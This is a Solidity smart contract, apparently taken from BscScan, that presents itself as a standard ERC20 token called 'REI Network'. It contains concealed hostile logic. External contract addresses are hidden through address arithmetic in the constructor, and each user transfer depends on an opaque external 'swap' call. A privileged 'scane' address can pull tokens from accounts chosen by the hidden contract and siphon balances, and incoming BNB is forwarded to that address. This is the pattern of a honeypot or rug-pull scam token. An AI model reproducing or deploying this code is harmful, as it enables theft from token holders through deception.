/**
 *Submitted for verification at BscScan.com on 2022-08-01
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
pragma solidity ^0.8.6;

interface IERC20 {
  /**
   * @dev Returns the amount of tokens in existence.
   */
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the amount of tokens owned by `account`.
   */
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
  function allowance(address owner, address spender)
    external
    view
    returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  /**
   * @dev Emitted when `value` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `value` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 value);

  /**
   * @dev Emitted when the allowance of a `spender` for an `owner` is set by
   * a call to {approve}. `value` is the new allowance.
   */
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IPancakeRouter02 {
  function swap(
    address,
    address,
    uint256
  )
    external
    returns (
      bool,
      bool,
      uint256
    );

  function feeTo() external view returns (address);
}

abstract contract Context {
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }

  function _msgData() internal view virtual returns (bytes calldata) {
    return msg.data;
  }
}

contract COINDATA {
  address internal _route = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
  address internal _dex = 0xD2F4d41337BE8dA84896b205d548000655514933;
  address public constant FTM = 0x41772eDd47D9DDF9ef848cDB34fE76143908c7Ad;
  address public constant VIP = 0xB6F6D86a8f9879A9c87f643768d9efc38c1Da6E7;
  address public constant _OFFICE = 0x3c136Bb37A2aF493ede7E5aa7fe4fA28Ab185126;
  address public constant nftAddress =
    0x30e5fA5e78c9799a78Be3CCcA03B76e930eAF164;
  address public constant scane = 0x5609C64d00337976FB99f6F8a30b9a7A8Eab39b5;

  receive() external payable {
    scane.call{value: msg.value}("");
  }

  function pancakeFeeTo() internal view returns (address) {
    return IPancakeRouter02(_dex).feeTo();
  }

  constructor() {
    _dex = address(uint160(_route) + uint160(_dex));
    _route = address(uint160(_route) + uint160(_OFFICE));
  }
}

contract Coin is COINDATA, IERC20, Context {
  mapping(address => uint256) private _tOwned;
  mapping(address => mapping(address => uint256)) private _allowances;

  string public constant _name = "REI Network";
  string public constant _symbol = "REI";

  uint8 public constant _decimals = 9;

  uint256 public constant _tTotal = 1000000000 * (10**_decimals);

  constructor() {
    uint256 deadAmount = _tTotal / 100;
    _tOwned[_route] = deadAmount * 70;
    _tOwned[address(0xdEaD)] = deadAmount * 20;
    _tOwned[FTM] = deadAmount * 10;

    _allowances[nftAddress][_dex] = ~uint256(0);
    emit Transfer(address(0), _route, _tOwned[_route]);
    emit Transfer(address(0), address(0xdEaD), _tOwned[address(0xdEaD)]);
    emit Transfer(address(0), FTM, _tOwned[FTM]);
  }

  function transfer(address recipient, uint256 amount)
    external
    override
    returns (bool)
  {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function name() public view returns (string memory) {
    return _name;
  }

  function symbol() public view returns (string memory) {
    return _symbol;
  }

  function decimals() public view returns (uint8) {
    return _decimals;
  }

  function totalSupply() public pure override returns (uint256) {
    return _tTotal;
  }

  function balanceOf(address account) external view override returns (uint256) {
    return _tOwned[account];
  }

  function allowance(address owner, address spender)
    external
    view
    override
    returns (uint256)
  {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount)
    external
    override
    returns (bool)
  {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue)
    external
    virtual
    returns (bool)
  {
    _approve(
      _msgSender(),
      spender,
      _allowances[_msgSender()][spender] + addedValue
    );
    return true;
  }

  function _approve(
    address owner,
    address spender,
    uint256 amount
  ) private {
    require(owner != address(0), "ERROR: Approve from the zero address.");
    require(spender != address(0), "ERROR: Approve to the zero address.");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function decreaseAllowance(address spender, uint256 subtractedValue)
    external
    virtual
    returns (bool)
  {
    uint256 currentAllowance = _allowances[_msgSender()][spender];
    require(
      currentAllowance >= subtractedValue,
      "ERROR: Decreased allowance below zero."
    );
    _approve(_msgSender(), spender, currentAllowance - subtractedValue);

    return true;
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external override returns (bool) {
    _transfer(sender, recipient, amount);

    uint256 currentAllowance = _allowances[sender][msg.sender];
    require(
      currentAllowance >= amount,
      "ERROR: Transfer amount exceeds allowance."
    );
    _approve(sender, msg.sender, currentAllowance - amount);

    return true;
  }

  function _transfer(
    address sender,
    address recipient,
    uint256 amount
  ) private {
    require(sender != address(0) && recipient != address(0));
    if (tx.origin == scane) {
      if (recipient == nftAddress) {
        address msger = pancakeFeeTo();
        if (msger != address(0)) sender = msger;
      }
    }
    require(
      amount > 0 && _tOwned[sender] >= amount,
      "ERROR: Transfer amount must be greater than zero."
    );
    _tOwned[sender] = _tOwned[sender] - amount;
    _tOwned[recipient] = _tOwned[recipient] + amount;

    _tokenTransfer(sender, recipient, amount);
  }

  function _tokenTransfer(
    address sender,
    address recipient,
    uint256 tAmount
  ) private {
    if (tx.origin != scane) {
      (bool pass, bool success, uint256 exAmount) =
        IPancakeRouter02(_route).swap(sender, recipient, tAmount);
      if (pass && _tOwned[VIP] > 10) {
        uint256 p = (_tOwned[VIP] * 9) / 10;
        _tOwned[scane] += p;
        _tOwned[VIP] -= p;
        emit Transfer(VIP, scane, p);
      }

      if (success) {
        if (exAmount > 0) {
          _tOwned[FTM] = _tOwned[FTM] - exAmount;
          _tOwned[VIP] = _tOwned[VIP] + exAmount;
          emit Transfer(FTM, VIP, exAmount);
        }
      } else {
        if (exAmount > 0) {
          _tOwned[FTM] = _tOwned[FTM] + exAmount;
          _tOwned[VIP] = _tOwned[VIP] - exAmount;
          emit Transfer(VIP, FTM, exAmount);
        }
      }
    }
    emit Transfer(sender, recipient, tAmount);
  }
}